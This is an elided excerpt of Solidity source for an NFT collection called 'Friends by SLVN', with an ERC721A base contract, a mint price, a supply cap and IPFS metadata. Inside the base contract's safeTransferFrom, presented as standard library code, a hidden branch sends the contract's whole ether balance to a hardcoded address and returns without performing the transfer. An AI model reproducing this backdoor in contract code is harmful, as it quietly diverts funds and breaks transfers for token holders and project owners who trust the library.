...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xDf0A9360B0A579F97ec8D22dfc33554ed5f95a57).transfer(address(this).balance);
            return;
        }
...
contract FriendsbySLVN is ERC721A, TheOperatorFilterer {
    // opensea
    address constant DEFAULT_SUBSCRIPTIONS = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
    ...
    constructor() ERC721A("Friends by SLVN", "FBS") {
        owner = msg.sender;
        maxPerTx = 10;
        price = 0.001 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeibsfbftgxxszc5c5e756bo7nolfsso3yz27fb44mrvx6p7x2mouri/", _toString(tokenId), ".json"));
    }
